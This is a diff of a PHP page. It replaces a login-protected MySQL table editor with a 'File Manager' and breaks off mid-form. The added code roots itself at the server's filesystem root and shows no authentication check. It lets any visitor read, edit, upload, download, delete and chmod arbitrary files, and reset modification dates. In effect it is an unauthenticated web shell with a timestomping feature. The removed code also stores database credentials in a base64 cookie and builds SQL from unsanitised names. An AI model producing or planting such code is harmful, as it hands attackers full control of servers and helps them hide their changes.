@@ -1,445 +1,672 @@
+<head>
+    <title>File Manager</title>
+    
+   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📁</text></svg>">
+</head>
 <?php
-// Start session and handle login/logout
+// Enable all error reporting
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+ini_set('log_errors', 1);
+
+// Your existing session code...
+// Close any existing sessions first
+if (session_status() === PHP_SESSION_ACTIVE) {
+    session_write_close();
+}
+
+// Start fresh session for file manager
+session_name('filemanager');
 session_start();
 
-// Handle logout
-if (isset($_GET['logout'])) {
-    // Clear all session variables
-    $_SESSION = array();
-    
-    // Delete session cookie
-    if (ini_get("session.use_cookies")) {
-        $params = session_get_cookie_params();
-        setcookie(session_name(), '', time() - 42000,
-            $params["path"], $params["domain"],
-            $params["secure"], $params["httponly"]
-        );
-    }
-    
-    // Destroy the session
-    session_destroy();
-    
-    // Delete remember me cookie if exists
-    if (isset($_COOKIE['remember_me'])) {
-        setcookie('remember_me', '', time() - 3600, '/');
-    }
-    
-    // Redirect to login page
-    header("Location: " . str_replace('?logout', '', $_SERVER['REQUEST_URI']));
-    exit;
+
+
+$ROOT = realpath('/');
+$reqPath = trim((string)($_GET['path'] ?? ''), "/");
+$CURRENT = $reqPath === '' ? $ROOT : realpath($ROOT . '/' . $reqPath);
+if ($CURRENT === false || strpos($CURRENT, $ROOT) !== 0) {
+    $CURRENT = $ROOT;
+    $reqPath = '';
 }
 
-// Check if user is logged in via session or remember me cookie
-$is_logged_in = false;
-if (isset($_SESSION['db_credentials'])) {
-    $is_logged_in = true;
-    $db_credentials = $_SESSION['db_credentials'];
-} elseif (isset($_COOKIE['remember_me'])) {
-    // Check if remember me cookie is valid
-    $remember_data = json_decode(base64_decode($_COOKIE['remember_me']), true);
-    if (is_array($remember_data) && isset($remember_data['db_credentials'])) {
-        $is_logged_in = true;
-        $db_credentials = $remember_data['db_credentials'];
-        $_SESSION['db_credentials'] = $db_credentials;
-    }
-}
-
-// Process login form
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
-    $host = $_POST['host'] ?? '';
-    $db = $_POST['db'] ?? '';
-    $user = $_POST['user'] ?? '';
-    $pass = $_POST['pass'] ?? '';
-    $charset = $_POST['charset'] ?? 'utf8mb4';
-    $remember = isset($_POST['remember']);
-    
-    // Test database connection
-    try {
-        $dsn = "mysql:host=$host;dbname=$db;charset=$charset";
-        $options = [
-            PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
-            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
-            PDO::ATTR_EMULATE_PREPARES   => false,
-        ];
-        $pdo = new PDO($dsn, $user, $pass, $options);
-        
-        // Store credentials in session
-        $db_credentials = compact('host', 'db', 'user', 'pass', 'charset');
-        $_SESSION['db_credentials'] = $db_credentials;
-        
-        // Set remember me cookie if requested
-        if ($remember) {
-            $remember_data = ['db_credentials' => $db_credentials];
-            $cookie_value = base64_encode(json_encode($remember_data));
-            setcookie('remember_me', $cookie_value, time() + (30 * 24 * 60 * 60), '/'); // 30 days
-        }
-        
-        $is_logged_in = true;
-    } catch (\PDOException $e) {
-        $error = "Database connection failed: " . $e->getMessage();
-    }
-}
-
-// If not logged in, show login form
-if (!$is_logged_in) {
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Database Login</title>
-        <style>
-            body { font-family: sans-serif; max-width: 500px; margin: 50px auto; padding: 20px; }
-            .login-form { background: #f9f9f9; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-            .form-group { margin-bottom: 15px; }
-            label { display: block; margin-bottom: 5px; font-weight: bold; }
-            input[type="text"], input[type="password"] { width: 100%; padding: 8px; box-sizing: border-box; }
-            button { background: #007bff; color: white; border: none; padding: 10px 15px; cursor: pointer; }
-            .error { color: red; margin-bottom: 15px; }
-        </style>
-    </head>
-    <body>
-        <h1>Database Login</h1>
-        <?php if (isset($error)): ?>
-            <div class="error"><?php echo htmlspecialchars($error); ?></div>
-        <?php endif; ?>
-        <form method="post" class="login-form">
-            <input type="hidden" name="login" value="1">
-            <div class="form-group">
-                <label for="host">Host:</label>
-                <input type="text" id="host" name="host" value="<?php echo htmlspecialchars($_POST['host'] ?? '127.0.0.1'); ?>" required>
-            </div>
-            <div class="form-group">
-                <label for="db">Database Name:</label>
-                <input type="text" id="db" name="db" value="<?php echo htmlspecialchars($_POST['db'] ?? ''); ?>" required>
-            </div>
-            <div class="form-group">
-                <label for="user">Username:</label>
-                <input type="text" id="user" name="user" value="<?php echo htmlspecialchars($_POST['user'] ?? ''); ?>" required>
-            </div>
-            <div class="form-group">
-                <label for="pass">Password:</label>
-                <input type="password" id="pass" name="pass" value="<?php echo htmlspecialchars($_POST['pass'] ?? ''); ?>">
-            </div>
-            <div class="form-group">
-                <label for="charset">Charset:</label>
-                <input type="text" id="charset" name="charset" value="<?php echo htmlspecialchars($_POST['charset'] ?? 'utf8mb4'); ?>">
-            </div>
-            <div class="form-group">
-                <label>
-                    <input type="checkbox" name="remember" value="1" <?php echo isset($_POST['remember']) ? 'checked' : ''; ?>>
-                    Remember me (stay logged in)
-                </label>
-            </div>
-            <button type="submit">Connect to Database</button>
-        </form>
-    </body>
-    </html>
-    <?php
-    exit;
-}
-
-// If logged in, proceed with the database editor
-extract($db_credentials);
-
-// Create PDO connection with stored credentials
-try {
-    $dsn = "mysql:host=$host;dbname=$db;charset=$charset";
-    $options = [
-        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
-        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
-        PDO::ATTR_EMULATE_PREPARES   => false,
-    ];
-    $pdo = new PDO($dsn, $user, $pass, $options);
-} catch (\PDOException $e) {
-    // If connection fails, clear session and redirect to login
-    unset($_SESSION['db_credentials']);
-    if (isset($_COOKIE['remember_me'])) {
-        setcookie('remember_me', '', time() - 3600, '/');
-    }
-    header("Location: " . $_SERVER['PHP_SELF']);
-    exit;
-}
-
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
-
-// --- 2. Process POST Actions (Add, Update, Delete) ---
+/* ==========================
+   POST HANDLING (MOVED HERE!)
+   ========================== */
+   
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
- 
-  // -- HANDLE INSERT --
-  if ($_POST['action'] === 'insert' && isset($_POST['data'], $_POST['table'])) {
-    $table = $_POST['table'];
-    $data = array_filter($_POST['data'], function($value) {
-      return $value !== '';
-    });
-    $columns = array_keys($data);
-    $placeholders = array_fill(0, count($columns), '?');
-    $sql = "INSERT INTO `$table` (`" . implode('`, `', $columns) . "`) VALUES (" . implode(', ', $placeholders) . ")";
-    $stmt = $pdo->prepare($sql);
-    $stmt->execute(array_values($data));
-  }
- 
-  // -- HANDLE UPDATE --
-  if ($_POST['action'] === 'update' && isset($_POST['data'], $_POST['table'], $_POST['primary_key'], $_POST['primary_value'])) {
-    $table = $_POST['table'];
-    $data = $_POST['data'];
-    $pk = $_POST['primary_key'];
-    $pk_val = $_POST['primary_value'];
+    $action = (string)$_POST['action'];
+    $targetRel = (string)($_POST['path'] ?? '');
+    $targetAbs = fm_safe_target($targetRel);
 
-    // Filter out empty values to prevent a SQL syntax error
-    $data = array_filter($data, function($value) {
-      return $value !== '';
-    });
+    switch ($action) {
+        case 'delete':
+            if ($targetAbs && $targetAbs !== $ROOT && file_exists($targetAbs)) {
+                if (is_dir($targetAbs)) {
+                    fm_delete_dir($targetAbs);
+                } else {
+                    @unlink($targetAbs);
+                }
+            }
+            $parentRel = trim(dirname($targetRel), '/');
+            header("Location: ?path=" . urlencode($parentRel));
+            exit;
 
-    if (!empty($data)) {
-      $setParts = [];
-      $params = [];
-      foreach ($data as $col => $val) {
-        $setParts[] = "`$col` = ?";
-        $params[] = $val;
-      }
-      $params[] = $pk_val;
-      $sql = "UPDATE `$table` SET " . implode(', ', $setParts) . " WHERE `$pk` = ?";
-      $stmt = $pdo->prepare($sql);
-      $stmt->execute($params);
-    }
-  }
- 
-  // -- HANDLE DELETE --
-  if ($_POST['action'] === 'delete' && isset($_POST['table'], $_POST['primary_key'], $_POST['primary_value'])) {
-    $table = $_POST['table'];
-    $pk = $_POST['primary_key'];
-    $pk_val = $_POST['primary_value'];
-    $sql = "DELETE FROM `$table` WHERE `$pk` = ?";
-    $stmt = $pdo->prepare($sql);
-    $stmt->execute([$pk_val]);
-  }
+        case 'create_file':
+            $name = trim((string)($_POST['name'] ?? ''));
+            if ($name !== '' && !str_contains($name, '/')) {
+                $newAbs = fm_safe_target(($reqPath ? $reqPath.'/' : '').$name, true);
+                if ($newAbs && !file_exists($newAbs)) {
+                    @file_put_contents($newAbs, "");
+                }
+            }
+            header("Location: ?path=" . urlencode($reqPath));
+            exit;
 
-    // --- NEW: Handle Add Column ---
-    if ($_POST['action'] === 'add_column' && isset($_POST['table'], $_POST['column_name'], $_POST['data_type'], $_POST['default_value'])) {
-        $table = $_POST['table'];
-        $columnName = $_POST['column_name'];
-        $dataType = $_POST['data_type'];
-        $defaultValue = $_POST['default_value'];
+        case 'create_folder':
+            $name = trim((string)($_POST['name'] ?? ''));
+            if ($name !== '' && !str_contains($name, '/')) {
+                $newAbs = fm_safe_target(($reqPath ? $reqPath.'/' : '').$name, true);
+                if ($newAbs && !file_exists($newAbs)) {
+                    @mkdir($newAbs, 0755);
+                }
+            }
+            header("Location: ?path=" . urlencode($reqPath));
+            exit;
 
-        $sql = "ALTER TABLE `$table` ADD COLUMN `$columnName` $dataType";
-        
-        if (!empty($defaultValue)) {
-            $sql .= " DEFAULT " . $pdo->quote($defaultValue);
-        }
-        
-        try {
-            $pdo->exec($sql);
-        } catch (\PDOException $e) {
-            echo "<script>alert('Error: " . htmlspecialchars($e->getMessage()) . "');</script>";
-        }
+        case 'rename':
+            $new = trim((string)($_POST['new_name'] ?? ''));
+            if ($targetAbs && $new !== '' && !str_contains($new, '/')) {
+                $destAbs = dirname($targetAbs) . '/' . $new;
+                if (strpos(realpath(dirname($destAbs)), $ROOT) === 0) {
+                    @rename($targetAbs, $destAbs);
+                }
+            }
+            $parentRel = trim(dirname($targetRel), '/');
+            header("Location: ?path=" . urlencode($parentRel));
+            exit;
+
+        case 'upload':
+    error_log("UPLOAD STARTED");
+    
+    // Check if file was uploaded successfully
+    if (empty($_FILES['upload']['name']) || $_FILES['upload']['error'] !== UPLOAD_ERR_OK) {
+        error_log("UPLOAD ERROR: " . ($_FILES['upload']['error'] ?? 'No file'));
+        header("Location: ?path=" . urlencode($reqPath));
+        exit;
     }
 
-    // --- NEW: Handle Modify Column ---
-    if ($_POST['action'] === 'modify_column' && isset($_POST['table'], $_POST['old_column_name'], $_POST['new_column_name'], $_POST['new_data_type'])) {
-        $table = $_POST['table'];
-        $oldColumnName = $_POST['old_column_name'];
-        $newColumnName = $_POST['new_column_name'];
-        $newDataType = $_POST['new_data_type'];
-
-        $sql = "ALTER TABLE `$table` CHANGE COLUMN `$oldColumnName` `$newColumnName` $newDataType";
-        
-        try {
-            $pdo->exec($sql);
-        } catch (\PDOException $e) {
-            echo "<script>alert('Error: " . htmlspecialchars($e->getMessage()) . "');</script>";
-        }
+    $filename = basename($_FILES['upload']['name']);
+    $destRel = ($reqPath ? $reqPath.'/' : '') . $filename;
+    $destAbs = fm_safe_target($destRel, true);
+    
+    error_log("Uploading: $filename to $destAbs");
+    
+    if (!$destAbs) {
+        error_log("UPLOAD BLOCKED: Safe target returned null");
+        header("Location: ?path=" . urlencode($reqPath));
+        exit;
     }
 
-  // -- Redirect to the same page to prevent form resubmission --
-  header("Location: " . $_SERVER['PHP_SELF'] . "?table=" . urlencode($_POST['table']));
-  exit;
+    $tempFile = $_FILES['upload']['tmp_name'];
+    
+    // Verify temp file
+    if (!file_exists($tempFile)) {
+        error_log("UPLOAD ERROR: Temp file missing");
+        header("Location: ?path=" . urlencode($reqPath));
+        exit;
+    }
+
+    // Ensure directory exists
+    $destDir = dirname($destAbs);
+    if (!is_dir($destDir)) {
+        mkdir($destDir, 0755, true);
+    }
+
+    // Copy with error handling
+    if (copy($tempFile, $destAbs)) {
+        error_log("UPLOAD SUCCESS: $destAbs");
+        // Verify the copy worked
+        if (file_exists($destAbs) && filesize($destAbs) > 0) {
+            error_log("UPLOAD VERIFIED: File exists with size " . filesize($destAbs));
+        } else {
+            error_log("UPLOAD WARNING: Copy succeeded but file missing or empty");
+        }
+        unlink($tempFile);
+    } else {
+        error_log("UPLOAD FAILED: Copy operation failed");
+        error_log("Source readable: " . (is_readable($tempFile) ? 'YES' : 'NO'));
+        error_log("Dest writable: " . (is_writable($destDir) ? 'YES' : 'NO'));
+        error_log("Last error: " . (error_get_last()['message'] ?? 'Unknown'));
+    }
+
+    header("Location: ?path=" . urlencode($reqPath));
+    exit;
+        case 'download':
+            if ($targetAbs && is_file($targetAbs)) {
+                header('Content-Description: File Transfer');
+                header('Content-Type: application/octet-stream');
+                header('Content-Disposition: attachment; filename="'.basename($targetAbs).'"');
+                header('Content-Length: ' . filesize($targetAbs));
+                readfile($targetAbs);
+                exit;
+            }
+            header("Location: ?path=" . urlencode($reqPath));
+            exit;
+
+        case 'save':
+    $fileRel = (string)($_POST['file_path'] ?? '');
+    $targetAbs = fm_safe_target($fileRel);
+    
+    if (!$targetAbs) {
+        error_log("SAVE FAILED: Safe target blocked - $fileRel");
+        $saveError = "Security validation failed for path: " . htmlspecialchars($fileRel);
+    } elseif (!is_file($targetAbs)) {
+        error_log("SAVE FAILED: Not a file - $targetAbs");
+        $saveError = "File does not exist: " . htmlspecialchars($fileRel);
+    } elseif (!is_writable($targetAbs)) {
+        error_log("SAVE FAILED: Not writable - $targetAbs");
+        $saveError = "File is not writable. Check permissions: " . htmlspecialchars($fileRel);
+    } else {
+        $content = (string)($_POST['content'] ?? '');
+        
+        // Use file locking to prevent race conditions
+        if ($handle = @fopen($targetAbs, 'wb')) {
+            if (flock($handle, LOCK_EX)) {
+                $bytes = fwrite($handle, $content);
+                fflush($handle);
+                flock($handle, LOCK_UN);
+                if ($bytes !== false) {
+                    $saveSuccess = "File saved successfully! (" . $bytes . " bytes written)";
+                    // Update modification time
+                    @touch($targetAbs);
+                } else {
+                    $saveError = "Failed to write content to file.";
+                }
+            } else {
+                $saveError = "Could not lock file for writing (another process may be using it).";
+            }
+            fclose($handle);
+        } else {
+            $saveError = "Failed to open file for writing. Check file permissions.";
+        }
+    }
+    break;
+
+        case 'change_date':
+            $newM = (string)($_POST['new_mtime'] ?? '');
+            $ts = strtotime($newM);
+            if ($targetAbs && $ts !== false) {
+                @touch($targetAbs, $ts, $ts);
+            }
+            $parentRel = trim(dirname($targetRel), '/');
+            header("Location: ?path=" . urlencode($parentRel));
+            exit;
+
+        // NEW: chmod feature
+        case 'chmod':
+            $newPerms = (string)($_POST['new_perms'] ?? '');
+            if ($targetAbs && preg_match('/^[0-7]{3,4}$/', $newPerms)) {
+                @chmod($targetAbs, octdec($newPerms));
+            }
+            $parentRel = trim(dirname($targetRel), '/');
+            header("Location: ?path=" . urlencode($parentRel));
+            exit;
+    }
+}
+/* ==========================
+   FILE EDIT VIEW
+   ========================== */
+if (is_file($CURRENT)) {
+    // Double-check file accessibility
+    if (!is_readable($CURRENT) || !is_writable($CURRENT)) {
+        header("HTTP/1.0 403 Forbidden");
+        die("File access denied: Check file permissions for " . htmlspecialchars($CURRENT));
+    }
+    
+    $content = @file_get_contents($CURRENT);
+    if ($content === false) {
+        header("HTTP/1.0 500 Internal Server Error");
+        die("Unable to read file: " . htmlspecialchars($CURRENT));
+    }
+    
+    $fileRel = $reqPath;
+    $parentRel = trim(dirname($fileRel), '/');
+    $mtime = @filemtime($CURRENT);
+    
+    // Enhanced save handling
+    $saveMessage = '';
+    if (!empty($saveSuccess)) {
+        $saveMessage = '<div style="background:var(--ok);color:white;padding:10px;border-radius:8px;margin-bottom:16px;">'.$saveSuccess.'</div>';
+    } elseif (!empty($saveError)) {
+        $saveMessage = '<div style="background:var(--danger);color:white;padding:10px;border-radius:8px;margin-bottom:16px;">'.$saveError.'</div>';
+    }
+    
+    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Edit '.htmlspecialchars(basename($CURRENT)).'</title>
+    <style>
+    :root{
+    --bg: #0f172a; /* Dark blue background */
+    --card: #1e293b; /* Darker cards/containers */
+    --text: #e2e8f0; /* Light gray text */
+    --muted: #94a3b8; /* Muted text */
+    --pri: #3b82f6; /* Blue primary */
+    --danger: #ef4444; /* Red danger */
+    --warn: #f59e0b; /* Amber warning */
+    --ok: #10b981; /* Green success */
+}
+body{
+    margin:0;
+    background:var(--bg);
+    color: var(--text); /* Add text color */
+    font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial;
+    padding:24px
+}
+.wrap{max-width:1100px;margin:0 auto}
+    .bar{display:flex;gap:8px;align-items:center;margin-bottom:16px}
+    .btn{padding:8px 12px;border:none;border-radius:10px;background:var(--pri);color:#fff;font-weight:600;cursor:pointer}
+    .btn.outline{background:transparent;color:var(--pri);border:1px solid #dbe2ea}
+    .btn.danger{background:var(--danger)}
+    .btn.gray{background:#6b6b6b;color:#111}
+textarea{
+    width:100%;
+    height:60vh;
+    border:1px solid #475569;
+    border-radius:12px;
+    padding:12px;
+    font-family:ui-monospace,SFMono-Regular,Consolas,Monaco,monospace;
+    background: #1a2332; /* Slightly darker than the card background */
+    color: #e2e8f0; /* Light text color */
+    resize: vertical; /* Optional: only allow vertical resizing */
+}    .row{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px}
+    .card{background:#1a2332;border-radius:14px;padding:14px;border:1px solid #475569}
+    label{font-size:12px;color:var(--muted);display:block;margin-bottom:6px}
+    input[type="datetime-local"]{padding:8px 10px;border:1px solid #e1e6ee;border-radius:10px}
+    .breadcrumb a:link {
+  color: #829bb0;
+}
+input[type="text"],
+input[type="datetime-local"],
+input[type="file"]{
+    padding:6px 8px;
+    border:1px solid #475569; /* Darker border */
+    border-radius:10px;
+    background: var(--card); /* Dark background */
+    color: var(--text); /* Light text */
 }
 
-// --- 3. Pagination Setup ---
-// Number of records per page
-$limit = 20;
+.breadcrumb a:visited {
+  color: #829bb0;
+}
 
-// Get the current page number from the URL, default to 1
-$page = $_GET['page'] ?? 1;
+.breadcrumb a:hover {
+  color: #9bc0e1;
+}
 
-// Calculate the offset
-$offset = ($page - 1) * $limit;
-?>
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Database Editor</title>
-  <style>
-    body { font-family: sans-serif; }
-    h2 { margin-top: 40px; }
-    table { border-collapse: collapse; width: 100%; margin-bottom: 30px; }
-    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
-    th { background: #eee; }
-    td.actions-cell { display: flex; gap: 5px; }
-    tr.add-row td { background: #f9f9f9; }
-    input[type="text"], input[type="email"], input[type="number"] { box-sizing: border-box; width: 100%; }
-    button { padding: 5px 10px; cursor: pointer; }
-    button.delete-btn { background-color: #f44336; color: white; border: none; }
-    input:disabled { background: #eee; color: #999; }
-    .pagination { margin: 20px 0; display: flex; gap: 10px; }
-    .pagination a { padding: 8px 12px; border: 1px solid #ccc; text-decoration: none; color: #333; }
-    .pagination a.active { background-color: #007bff; color: white; border-color: #007bff; }
-    .column-forms { margin-top: 20px; padding: 15px; border: 1px solid #ddd; background: #f7f7f7; }
-        .column-forms h4 { margin-top: 0; }
-        .column-forms form { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
-        .column-forms input, .column-forms select { padding: 5px; }
-    .logout-btn { 
-        position: fixed; 
-        top: 15px; 
-        right: 15px; 
-        background: #dc3545; 
-        color: white; 
-        padding: 8px 15px; 
-        text-decoration: none; 
-        border-radius: 4px;
-        z-index: 1000;
+.breadcrumb a:active {
+  color: #9bc0e1;
+}
+/* Unvisited link */
+a:link {
+  color: #829bb0;
+}
+
+/* Visited link */
+a:visited {
+  color: #829bb0;
+}
+
+/* Mouse over link */
+a:hover {
+  color: #9bc0e1;
+}
+
+/* Selected link */
+a:active {
+  color: #9bc0e1;
+}
+</style></head><body><div class="wrap">';
+
+    echo fm_breadcrumb($reqPath);
+    
+    // Display save message here
+    echo $saveMessage;
+
+    echo '<br>';
+
+    echo '<div class="bar">
+    
+            <a class="btn gray" href="?path='.urlencode($parentRel).'" style="display:inline; text-decoration:none;">← Back</a>
+           
+
+            <form method="post" onsubmit="return confirm(\'Delete this file?\');" style="display:inline;">
+                <input type="hidden" name="action" value="delete">
+                <input type="hidden" name="path" value="'.htmlspecialchars($fileRel).'">
+                <button class="btn danger" type="submit">Delete</button>
+            </form>
+            <form method="post" action="" style="display:inline;">
+                <input type="hidden" name="action" value="download">
+                <input type="hidden" name="path" value="'.htmlspecialchars($fileRel).'">
+                <button class="btn gray" type="submit">Download</button>
+            </form>
+          </div>';
+
+    echo '<form method="post">
+        <input type="hidden" name="action" value="save">
+        <input type="hidden" name="file_path" value="'.htmlspecialchars($fileRel).'">
+        <textarea name="content" id="fileContent">'.htmlspecialchars((string)$content).'</textarea>
+        <div class="bar" style="margin-top:12px;">
+            <button class="btn gray" type="submit" id="saveBtn">Save Changes</button>
+            <span style="color:var(--muted);font-size:14px;margin-left:12px;">File: '.htmlspecialchars($fileRel).'</span>
+        </div>
+      </form>';
+
+    echo '<div class="row">
+            <div class="card">
+                <form method="post">
+                    <input type="hidden" name="action" value="change_date">
+                    <input type="hidden" name="path" value="'.htmlspecialchars($fileRel).'">
+                    <label>Set Modified Date/Time</label>
+                    <input type="datetime-local" name="new_mtime" value="'.htmlspecialchars($mtime? date('Y-m-d\TH:i:s', $mtime) : '').'" step="1">
+                    <button class="btn gray" type="submit" style="margin-left:8px">Update</button>
+                </form>
+            </div>
+          </div>';
+
+    // Add some JavaScript to prevent accidental navigation
+    echo '<script>
+        let isDirty = false;
+        const textarea = document.getElementById("fileContent");
+        const saveBtn = document.getElementById("saveBtn");
+        
+        textarea.addEventListener("input", () => {
+            isDirty = true;
+            saveBtn.textContent = "Save Changes *";
+            saveBtn.style.background = "var(--warn)";
+        });
+        
+        window.addEventListener("beforeunload", (e) => {
+            if (isDirty) {
+                e.preventDefault();
+                e.returnValue = "You have unsaved changes. Are you sure you want to leave?";
+            }
+        });
+        
+        document.querySelector("form").addEventListener("submit", () => {
+            isDirty = false;
+        });
+    </script>';
+
+    echo '</div></body></html>';
+    exit;
+}
+
+
+function fm_safe_target(string $rel, bool $forCreate = false): ?string {
+    global $ROOT;
+    
+    $rel = ltrim($rel, "/");
+    
+    // Basic security checks
+    if (strpos($rel, '..') !== false || strpos($rel, "\0") !== false) {
+        error_log("SAFE_TARGET BLOCKED: Path traversal detected - $rel");
+        return null;
     }
-    .logout-btn:hover { background: #c82333; }
-  </style>
-</head>
-<body>
-  <a href="?logout=1" class="logout-btn">Logout</a>
-  <h1>Database Table Editor</h1>
-
-<?php
-// Get all table names
-$tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
-
-foreach ($tables as $tableName):
-  echo "<h2>Table: " . htmlspecialchars($tableName) . "</h2>";
- 
-  $columnsResult = $pdo->query("DESCRIBE `$tableName`")->fetchAll(PDO::FETCH_ASSOC);
-  $primaryKey = '';
-  $isAutoIncrement = false;
-  foreach ($columnsResult as $col) {
-    if ($col['Key'] === 'PRI') {
-      $primaryKey = $col['Field'];
-      if (strpos($col['Extra'], 'auto_increment') !== false) {
-        $isAutoIncrement = true;
-      }
-      break;
+    
+    $target = $ROOT . '/' . $rel;
+    
+    if ($forCreate) {
+        // For create operations, check if parent directory exists and is within ROOT
+        $parent = dirname($target);
+        
+        // Use realpath on parent only, not on target (which may not exist yet)
+        $parentReal = realpath($parent);
+        if ($parentReal === false) {
+            // Parent doesn't exist, but we might create it
+            // Check if the theoretical parent path is within ROOT
+            if (strpos($parent, $ROOT) === 0) {
+                return $target;
+            }
+            error_log("SAFE_TARGET BLOCKED: Parent outside ROOT - $parent");
+            return null;
+        }
+        
+        if (strpos($parentReal, $ROOT) === 0) {
+            return $target;
+        }
+        error_log("SAFE_TARGET BLOCKED: Parent realpath outside ROOT - $parentReal");
+        return null;
     }
-  }
-  if (empty($primaryKey) && !empty($columnsResult)) {
-    $primaryKey = $columnsResult[0]['Field'];
-  }
- 
-  // New pagination queries
-  $totalRowsStmt = $pdo->query("SELECT COUNT(*) FROM `$tableName`");
-  $totalRows = $totalRowsStmt->fetchColumn();
-  $totalPages = ceil($totalRows / $limit);
-  $rows = $pdo->query("SELECT * FROM `$tableName` LIMIT $limit OFFSET $offset")->fetchAll(PDO::FETCH_ASSOC);
-?>
-    <div class="column-forms">
-        <h4>Add a New Column</h4>
-        <form method="post" action="">
-            <input type="hidden" name="action" value="add_column">
-            <input type="hidden" name="table" value="<?php echo htmlspecialchars($tableName); ?>">
-            <label>Name: <input type="text" name="column_name" required></label>
-            <label>Data Type:
-                <select name="data_type">
-                    <option value="VARCHAR(255)">VARCHAR(255)</option>
-                    <option value="INT">INT</option>
-                    <option value="TEXT">TEXT</option>
-                    <option value="DATE">DATE</option>
-                    <option value="BOOLEAN">BOOLEAN</option>
-                    <option value="FLOAT">FLOAT</option>
-                </select>
-            </label>
-            <label>Default Value: <input type="text" name="default_value"></label>
-            <button type="submit">Add Column</button>
+    
+    // For existing files, use a more tolerant approach
+    if (file_exists($target)) {
+        $real = realpath($target);
+        if ($real !== false && strpos($real, $ROOT) === 0) {
+            return $real;
+        }
+        error_log("SAFE_TARGET BLOCKED: File exists but realpath failed - $target");
+    } else {
+        error_log("SAFE_TARGET BLOCKED: File doesn't exist - $target");
+    }
+    
+    return null;
+}
+
+
+function fm_perms(string $path): string {
+    return substr(sprintf('%o', fileperms($path)), -4);
+}
+
+
+$items = @scandir($CURRENT) ?: [];
+$dirs = $files = [];
+foreach ($items as $it) {
+    if ($it === '.' || $it === '..') continue;
+    $abs = $CURRENT . '/' . $it;
+    if (is_dir($abs)) $dirs[] = $it; else $files[] = $it;
+}
+natcasesort($dirs);
+natcasesort($files);
+$listed = array_merge($dirs, $files);
+
+echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>File Manager</title>
+<style>
+:root{
+    --bg: #0f172a; /* Dark blue background */
+    --card: #1e293b; /* Darker cards/containers */
+    --text: #e2e8f0; /* Light gray text */
+    --muted: #94a3b8; /* Muted text */
+    --pri: #3b82f6; /* Blue primary */
+    --danger: #ef4444; /* Red danger */
+    --warn: #f59e0b; /* Amber warning */
+    --ok: #10b981; /* Green success */
+}
+*{box-sizing:border-box}
+body{
+    margin:0;
+    background:var(--bg);
+    color: var(--text); /* Add text color */
+    font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial;
+    padding:24px
+}
+.wrap{max-width:1200px;margin:0 auto}
+h1{margin:0 0 16px;font-size:22px}
+table{width:100%;border-collapse:separate;border-spacing:0 8px}
+th,td{padding:10px 12px}
+tr{
+    background: var(--card); /* Changed from #fff */
+    border:1px solid #334155; /* Darker border */
+    border-radius:12px
+}
+tr td:first-child{border-top-left-radius:12px;border-bottom-left-radius:12px}
+tr td:last-child{border-top-right-radius:12px;border-bottom-right-radius:12px}
+th{font-size:12px;color:var(--muted);text-align:left}
+.name a{color:#0a58ca;text-decoration:none}
+.badge{
+    font-size:12px;
+    color:var(--text); /* Changed from #555 */
+    background:#475569; /* Darker background */
+    padding:4px 8px;
+    border-radius:20px
+}
+.actions form{display:inline;margin:0 4px}
+.btn{padding:6px 10px;border:none;border-radius:10px;background:var(--pri);color:#fff;font-weight:600;cursor:pointer}
+.btn.small{padding:5px 8px;font-size:12px}
+.btn.danger{background:var(--danger)}
+.btn.warn{background:var(--warn)}
+.btn.gray{
+    background:#475569; /* Darker gray */
+    color:var(--text) /* Changed from #111 */
+}
+input[type="text"],
+input[type="datetime-local"],
+input[type="file"]{
+    padding:6px 8px;
+    border:1px solid #475569; /* Darker border */
+    border-radius:10px;
+    background: var(--card); /* Dark background */
+    color: var(--text); /* Light text */
+}
+.toolbar{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0}
+.icon{margin-right:6px}
+.meta{font-size:12px;color:var(--muted)}
+.breadcrumb a:link {
+  color: #829bb0;
+}
+
+.breadcrumb a:visited {
+  color: #829bb0;
+}
+
+.breadcrumb a:hover {
+  color: #9bc0e1;
+}
+
+.breadcrumb a:active {
+  color: #9bc0e1;
+}
+/* Unvisited link */
+a:link {
+  color: #829bb0;
+}
+
+/* Visited link */
+a:visited {
+  color: #829bb0;
+}
+
+/* Mouse over link */
+a:hover {
+  color: #9bc0e1;
+}
+
+/* Selected link */
+a:active {
+  color: #9bc0e1;
+}
+</style></head><body><div class="wrap">';
+
+echo fm_breadcrumb($reqPath);
+echo '<hr>';
+echo '<h1>Browsing: '.htmlspecialchars($reqPath === '' ? '/' : $reqPath).'</h1>';
+
+echo '<div class="toolbar">
+        <form method="post" enctype="multipart/form-data">
+            <input type="hidden" name="action" value="upload">
+            <input type="file" name="upload" required>
+            <button class="btn gray small" type="submit">Upload</button>
         </form>
-
-        <h4>Modify an Existing Column</h4>
-        <form method="post" action="">
-            <input type="hidden" name="action" value="modify_column">
-            <input type="hidden" name="table" value="<?php echo htmlspecialchars($tableName); ?>">
-            <label>Select Column:
-                <select name="old_column_name" required>
-                    <?php foreach ($columnsResult as $col): ?>
-                        <option value="<?php echo htmlspecialchars($col['Field']); ?>">
-                            <?php echo htmlspecialchars($col['Field']); ?> (<?php echo htmlspecialchars($col['Type']); ?>)
-                        </option>
-                    <?php endforeach; ?>
-                </select>
-            </label>
